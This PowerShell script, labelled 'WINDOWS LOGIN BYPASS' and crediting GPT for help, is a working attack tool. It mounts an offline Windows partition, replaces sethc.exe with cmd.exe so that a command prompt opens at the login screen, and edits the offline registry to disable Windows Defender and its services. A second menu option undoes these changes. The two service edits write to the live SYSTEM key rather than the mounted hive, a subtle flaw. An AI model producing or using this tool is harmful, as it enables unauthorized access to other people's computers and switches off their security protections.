# "This script would have been so hard without GPT, so I'm giving it the credit it deserves, especially for things like tables"

# List disks
$disks = Get-Disk
$disks | Format-Table -Property Number, FriendlyName, OperationalStatus, TotalSize, PartitionStyle

Write-Host "If you don't see the disk where Windows is installed, it means that the hard drive is encrypted, and there's nothing you can do except format it, which will result in losing all the data."

# Ask the user to select the disk
$validSelection = $false
while (-not $validSelection) {
    $diskNumber = Read-Host "Please enter the Disk Number where windows is installed"

    # Check if disk exists
    if ($disks.Number -contains [int]$diskNumber) {
        $validSelection = $true
    } else {
        Write-Host "Invalid Disk Number. Please enter a valid Disk Number."
    }
}

# Get the selected disk
$selectedDisk = Get-Disk -Number $diskNumber

# List the partitions 
$partitions = Get-Partition -DiskNumber $selectedDisk.Number

# Output the partitions
Write-Host "Partitions on Disk ${diskNumber}:"
$partitions | ForEach-Object {
    [PSCustomObject]@{
        'Partition Number' = $_.PartitionNumber
        'Type'             = $_.Type
        'Size (GB)'        = "{0:N2}" -f ($_.Size / 1GB)
        'Drive Letter'     = $_.DriveLetter
    }
} | Format-Table -AutoSize

# Ask the user to select the partition
$validPartitionSelection = $false
while (-not $validPartitionSelection) {
    $partitionNumber = Read-Host "Enter the Partition Number where windows is installed"

    # Check if partition exists
    if ($partitions.PartitionNumber -contains [int]$partitionNumber) {
        $validPartitionSelection = $true
    } else {
        Write-Host "Invalid Partition Number. Please enter a valid Partition Number."
    }
}

# Get the selected partition
$selectedPartition = $partitions | Where-Object { $_.PartitionNumber -eq [int]$partitionNumber }

# Get an avaiable letter
function Get-AvailableDriveLetters {
    $allDriveLetters = @('C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z')

    # Used drive letters
    $usedDriveLetters = Get-Volume | Where-Object { $_.DriveLetter } | Select-Object -ExpandProperty DriveLetter

    # Free letters
    $availableDriveLetters = $allDriveLetters | Where-Object { $usedDriveLetters -notcontains $_ }

    return $availableDriveLetters
}

# Get the first available drive letter
$availableDriveLetters = Get-AvailableDriveLetters
$availableDriveLetter = $availableDriveLetters[0]

# Assign the drive letter to the partition
if ($availableDriveLetter) {
    $selectedPartition | Set-Partition -NewDriveLetter $availableDriveLetter -Confirm:$false
    Write-Output ""
    Write-Host "Drive letter $availableDriveLetter assigned to Partition $($selectedPartition.PartitionNumber)"

    # Check if mounted successfully
    if (Test-Path "${availableDriveLetter}:\") {
        Write-Output ""
        Write-Host "Drive letter $availableDriveLetter successfully mounted."
        
        # Check if PerfLogs folder exists
        $path = "${availableDriveLetter}:\PerfLogs"
        if (Test-Path -Path $path) {
            Write-Output ""
            Write-Host "The PerfLogs folder exists at $path."
            # Extract drive letter from $path
            $driveLetter = $path.Substring(0, 1)
        } else {
            Write-Output ""
            Write-Host "The PerfLogs folder does not exist at $path."
            Write-Host "This is not a windows installation ot it is encrypted."
            exit
        }
    }
}

# Menu
function ShowMainMenu {
    Write-Host "WINDOWS LOGIN BYPASS"
    Write-Host ""
    Write-Host "[1] Enable admin on login page"
    Write-Host "[2] Disable admin on login page"
    Write-Host ""
    $menu = Read-Host "Type 1, 2 or 0 then press ENTER"
    
    switch ($menu) {
        '1' { EnableAdminOnLoginPage }
        '2' { DisableAdminOnLoginPage }
        '0' { exit }
        default { ShowMainMenu }
    }
}

function EnableAdminOnLoginPage {

    # Enable sticky keys
    Copy-Item -Path "sticky_run.bat" -Destination "${driveLetter}:\windows\system32" -Force
    Copy-Item -Path "sticky.bat" -Destination "${driveLetter}:\windows\system32" -Force
    Move-Item -Path "${driveLetter}:\windows\system32\sethc.exe" -Destination "${driveLetter}:\windows\system32\sethc.exe.bak" -Force
    Copy-Item -Path "${driveLetter}:\windows\system32\cmd.exe" -Destination "${driveLetter}:\windows\system32\sethc.exe" -Force

    # Disable Windows Defender
    reg load "HKLM\temp-hive" "${driveLetter}:\windows\system32\config\SOFTWARE"
    reg add "HKEY_LOCAL_MACHINE\temp-hive\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f
    reg add "HKEY_LOCAL_MACHINE\temp-hive\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d 1 /f
    reg add "HKEY_LOCAL_MACHINE\temp-hive\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d 1 /f
    reg add "HKEY_LOCAL_MACHINE\temp-hive\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d 1 /f
    reg add "HKEY_LOCAL_MACHINE\temp-hive\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f
    reg unload "HKLM\temp-hive"

    reg load "HKLM\temp-hive" "${driveLetter}:\windows\system32\config\SYSTEM"
    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SecurityHealthService" /v "Start" /t REG_DWORD /d 4 /f
    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinDefend" /v "Start" /t REG_DWORD /d 4 /f
    reg unload "HKLM\temp-hive"

    Write-Host "Completed"
    Pause
    Restart-Computer -Force
}

function DisableAdminOnLoginPage {

    # Disable sticky keys
    Remove-Item -Path "${driveLetter}:\windows\system32\sticky_run.bat" -Force
    Remove-Item -Path "${driveLetter}:\windows\system32\sticky.bat" -Force
    Remove-Item -Path "${driveLetter}:\windows\system32\sethc.exe" -Force
    Move-Item -Path "${driveLetter}:\windows\system32\sethc.exe.bak" -Destination "${driveLetter}:\windows\system32\sethc.exe" -Force

    # Enable Windows Defender
    reg load "HKLM\temp-hive" "${driveLetter}:\windows\system32\config\SOFTWARE"
    reg add "HKEY_LOCAL_MACHINE\temp-hive\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 0 /f
    reg add "HKEY_LOCAL_MACHINE\temp-hive\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d 0 /f
    reg add "HKEY_LOCAL_MACHINE\temp-hive\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d 0 /f
    reg add "HKEY_LOCAL_MACHINE\temp-hive\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d 0 /f
    reg add "HKEY_LOCAL_MACHINE\temp-hive\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 0 /f
    reg unload "HKLM\temp-hive"

    reg load "HKLM\temp-hive" "${driveLetter}:\windows\system32\config\SYSTEM"
    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SecurityHealthService" /v "Start" /t REG_DWORD /d 2 /f
    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinDefend" /v "Start" /t REG_DWORD /d 2 /f
    reg unload "HKLM\temp-hive"

    Write-Host "Completed"
    Pause
    Restart-Computer -Force
}

# Start the menu
Write-Output ""
ShowMainMenu